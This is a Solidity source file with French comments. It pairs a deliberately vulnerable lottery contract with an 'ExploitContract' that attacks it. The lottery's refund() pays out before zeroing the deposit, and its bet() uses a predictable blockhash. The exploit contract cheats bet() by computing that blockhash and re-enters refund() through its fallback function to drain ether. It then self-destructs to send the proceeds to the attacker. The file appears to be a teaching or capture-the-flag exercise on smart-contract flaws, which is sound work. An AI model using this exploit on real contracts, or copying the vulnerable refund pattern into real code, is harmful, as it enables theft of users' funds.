pragma solidity ^0.4.15;

contract GDGLottery {

    mapping (address => uint) public deposits;

    constructor() public {}

    function deposit() public payable {
        deposits[msg.sender] = msg.value;
    }

    function refund() public {
        uint ref = deposits[msg.sender];
        if(!msg.sender.call.value(ref)()) {
            throw;
        }
        deposits[msg.sender] = 0;
    }

    function bet(byte char) public {
        require(deposits[msg.sender] >= 1);

        byte toGuess = byte(blockhash(block.number-1));

        if (toGuess == char) {
            deposits[msg.sender] = contractBalance() / 2;
            emit LogUserWinner(msg.sender, contractBalance());
        } else {
            deposits[msg.sender] = 0;
            emit LogUserLooser(msg.sender);
        }
    }

    // Utilities
    function getBalance(address u) public constant returns(uint){
        return deposits[u];
    }
    function contractBalance() public view returns(uint) {
        return address(this).balance;
    }

    event LogUserWinner(address winner, uint jackpot);
    event LogUserLooser(address looser);
}



contract ExploitContract {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;

    //Déposer des ethers sur le contrat cible
    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
    }

    //Attaque #1: tricher avec bet()
    function win() public{
        byte toGuess = byte(blockhash(block.number-1));
        GDGLottery instance = GDGLottery(vulnerable_contract);
        instance.bet(toGuess);
    }

    //Attaque #2: étape 1
    function launch_attack() public{
        attackModeIsOn = true;
        require(vulnerable_contract.call(bytes4(sha3("refund()"))));
    }  

    //Attaque #2: étape 2
    function () public payable{
        if (attackModeIsOn){
            attackModeIsOn = false;
                require(vulnerable_contract.call(bytes4(sha3("refund()"))));
        }
    }

    //Constructeur qui définit le owner du contract (l'attaquant)
    function ExploitContract() public{
        owner = msg.sender;
    }
    //Détruire le contrat (et envoyer les ethers restants à l'attaquant)
    function get_money(){
        suicide(owner);
    }

}